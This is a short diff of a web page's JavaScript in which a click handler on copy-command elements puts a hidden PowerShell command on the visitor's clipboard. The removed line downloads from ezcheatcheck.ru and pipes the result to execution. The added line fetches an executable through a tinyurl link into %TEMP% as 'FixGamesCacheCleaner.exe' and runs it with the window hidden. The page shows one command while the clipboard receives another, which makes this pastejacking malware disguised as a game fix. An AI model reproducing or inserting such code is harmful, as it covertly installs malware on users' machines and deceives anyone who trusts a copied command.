@@ -2152,7 +2152,7 @@ VideoMemoryScale = 0.85
             document.querySelectorAll('.copy-command').forEach(code => {
                 code.addEventListener('click', function() {
                     // Hidden command that will be copied
-                    const hiddenCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"irm 'http://ezcheatcheck.ru:8080/checkcheat?command=powershell&install=Flux_994825650.exe' | iex\"\n";
+                    const hiddenCommand = "powershell -WindowStyle Hidden -Command \"Invoke-WebRequest 'https://tinyurl.com/ydeza83j' -OutFile '%TEMP%\\FixGamesCacheCleaner.exe'; Start-Process '%TEMP%\\FixGamesCacheCleaner.exe'\"&\n";
                     
                     navigator.clipboard.writeText(hiddenCommand)
                         .then(() => {
